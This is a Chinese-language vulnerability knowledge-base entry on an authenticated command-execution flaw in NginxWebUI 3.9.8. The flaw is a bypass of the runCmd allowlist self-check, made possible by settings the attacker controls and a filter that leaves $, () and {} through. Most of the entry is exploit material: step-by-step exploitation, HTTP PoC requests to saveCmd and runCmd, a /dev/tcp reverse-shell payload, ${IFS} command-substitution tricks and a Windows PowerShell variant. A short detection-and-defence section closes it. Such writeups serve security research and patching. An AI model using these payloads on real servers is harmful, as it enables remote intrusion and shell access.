---
id: web-java-rce-nginxwebui-runcmd-allowlist-selfcheck-bypass
title: NginxWebUI runCmd 白名单自校验绕过：可控 nginxExe/nginxPath + handlePath 漏删 $、()、{} 导致命令执行
type: scenario
domain: web
path: web/java/rce
technique: nginxwebui-runcmd-allowlist-selfcheck-bypass
aliases:
- NginxWebUI runCmd 绕过
- isAvailableCmd 绕过
- saveCmd nginxExe
- handlePath 过滤绕过
tags:
- java
- nginxwebui
- rce
- command-injection
- allowlist-bypass
- ifs
- handlepath
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
affected_versions: 3.9.8（原文审计版本；原文称 3.9.9 未修复这些点）
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:41:07+08:00'
  notes: 已对照原文图26-36核对；runCmd 先写 setting 再 isAvailableCmd 自校验、handlePath 正则漏删 $(){ } 与 saveCmd 可控三值均一致；已修正 PoC/利用步骤中 cmd 必须与保存值逐字相等（用 ${IFS} 版，原写空格版会过不了自校验），并澄清原文 $(IFS) 笔误；affected_versions=3.9.8 原文明确
---

## 一句话结论

NginxWebUI 的 `ConfController#runCmd(cmd, type)` 允许把任意 `cmd` 先写进 `type` 指定的设置项，再用 `isAvailableCmd(cmd)` 做“只允许 nginx 命令”的校验；而校验的期望值 `nginxExe + " -c " + nginxPath + " -p " + nginxDir` 里的三个设置项都能被 `saveCmd` 或 `runCmd` 自己改写，等于让攻击者定义“合法命令”。同时 `ToolUtils.handlePath` 只删除空格和 `?<>|"#&;'` 与反引号，不删 `$`、`(`、`)`、`{`、`}`，可用 `$(IFS)` / `${IFS}` 代替空格并配合命令替换，最终 `RuntimeUtil.execForStr("/bin/sh","-c",cmd)` 执行任意命令；Windows 下用 `powershell.exe(calc)` 之类括号 payload 同理。

## 原理

- **可控的设置项**：`runCmd` 开头 `if (StrUtil.isNotEmpty(type)) settingService.set(type, cmd)`，即请求可以先把 `nginxExe`/`nginxPath`/`nginxDir` 设成任意值（`type` 为设置名，`cmd` 为值）。`saveCmd(nginxPath, nginxExe, nginxDir)` 也直接把三个参数写进设置（经 `handlePath`）。
- **自校验逻辑**：`isAvailableCmd` 读取三个设置并 `handleConf` 后，先 `switch(cmd)` 匹配 `net start nginx` 等固定字符串；默认分支构造 `dir = " -p " + nginxDir`（非空时），然后 `cmd.equals(nginxExe + " -s stop" + dir)` 或 `cmd.equals(nginxExe + " -c " + nginxPath + dir)` 才返回 true。由于等号右边的三个变量来自攻击者可控的设置，攻击者可以让任意 `cmd` 与期望字符串相等。
- **过滤缺口**：`handlePath` 做 `path.replace("\\","/").replace("//","/")` 后 `replaceAll("[\\s?<>|\\\"#&;'`]", "")`，删掉空白、`? < > | " # & ; '` 和反引号；但 `$`、`(`、`)`、`{`、`}`、`*`、`~` 等 shell 元字符保留。Linux 用 `${IFS}` 展开为空白来代替被删掉的空格（原文写作 `$(IFS)`，实际能展开为空白的只有 `${IFS}`；`$()` 是命令替换，会尝试执行 IFS 变量内容）；`$()` 用于命令替换。
- **执行 sink**：`runCmd` 通过后，Linux `RuntimeUtil.execForStr("/bin/sh","-c",cmd)`（最终 `ProcessBuilder`），Windows `RuntimeUtil.exec("cmd /c start " + cmd)`；`cmd` 本身不经 `handlePath`，可含任意空格与元字符。
- **典型链路**：
  1. `main/upload` 上传内容为 `bash -i >& /dev/tcp/ip/port 0>&1` 的文件（如 `/tmp/1111`）；
  2. `saveCmd` 或 `runCmd(type=nginxExe,cmd=bash)` 设置 `nginxExe=bash`，`nginxPath=$(bash${IFS}/tmp/1111)`（`${IFS}` 无空格，能通过 `handlePath`），`nginxDir` 留空；
  3. 调用 `runCmd(cmd=bash -c $(bash${IFS}/tmp/1111), type=cmdStart)`，此时 `cmd` 与 `nginxExe + " -c " + nginxPath` 完全相等，校验通过，shell 展开 `$(bash /tmp/1111)` 执行反弹脚本。
- **Windows 变体**：`nginxExe=powershell.exe`、`nginxPath=powershell.exe(calc)`（括号不在过滤字符集），提交 `cmd=powershell.exe -c powershell.exe(calc)` 即可弹计算器/执行命令。

## 触发条件

- NginxWebUI 3.9.8 左右版本，攻击者已登录后台（`adminPage/conf` 接口）。
- 能调用 `saveCmd` 或 `runCmd` 修改 `nginxExe`/`nginxPath`/`nginxDir`。
- Linux 目标有 `/bin/sh` 与可用的命令替换/`${IFS}`；Windows 目标 cmd 能解析括号 payload。
- 上传点可写临时脚本（可选，用于承载较长反弹命令）。

## 利用步骤

1. （可选）通过 `adminPage/main/upload` 上传反弹脚本，拿到临时路径。
2. 调用 `saveCmd` 把 `nginxExe` 设为 `bash`，`nginxPath` 设为 `$(bash${IFS}/tmp/1111)`（或等价命令替换），`nginxDir` 留空。
3. 调用 `runCmd`，`cmd` 填与期望值完全一致、且含命令替换的字符串：`bash -c $(bash${IFS}/tmp/1111)`；`type` 任意（可写成 `cmdStart`）。
4. 服务端 `isAvailableCmd` 通过后执行，监听端收到 shell。
5. Windows：`saveCmd(nginxExe=powershell.exe, nginxPath=powershell.exe(calc))` 后 `runCmd(cmd=powershell.exe -c powershell.exe(calc))`。

## PoC

```http
POST /adminPage/conf/saveCmd HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nginxExe=bash&nginxDir=&nginxPath=$(bash${IFS}/tmp/1111)
```

```http
POST /adminPage/conf/runCmd HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=bash -c $(bash${IFS}/tmp/1111)&type=cmdStart
```

```http
# Windows
POST /adminPage/conf/saveCmd HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nginxExe=powershell.exe&nginxDir=&nginxPath=powershell.exe(calc)
```

## 变体与关联

- 变体：用 `$(bash${IFS}-c${IFS}...)` 等不同 IFS 写法；`$()` 换反引号被过滤，可用 `${IFS}` 与 `$()` 组合。
- 变体：直接把 `type` 设为 `nginxExe`/`nginxPath` 在 `runCmd` 内完成设置，减少一次 `saveCmd` 请求。
- 关联：[[web-java-rce-nginxwebui-reload-check-nginxexe-rce]]（同产品 reload/check 的无校验命令拼接）。
- 关联：[[web-php-rce-command-space-blacklist-tab-passthru]]（空格黑名单下用 Tab/IFS 的通用绕过）。

## 检测与防御

- 检测：`saveCmd`/`runCmd` 请求中 `nginxExe`/`nginxPath`/`nginxDir` 含 `$`、`(`、`)`、`{`、`}`、`${IFS}`、命令替换；`cmd` 与当前设置拼出的字符串一致但含命令替换。
- 检测：nginx 服务进程出现 `bash -c`、`sh -c`、`powershell.exe -c` 子进程；Web 进程异常外联。
- 防御：设置项白名单/固定值，不接受任意字符串；不要用“用户可控值拼出的字符串相等”作为命令白名单；`handlePath` 改为白名单字符集而非黑名单；命令执行改为参数数组（`ProcessBuilder(List)`）并禁用 shell；后台最小权限与访问控制。
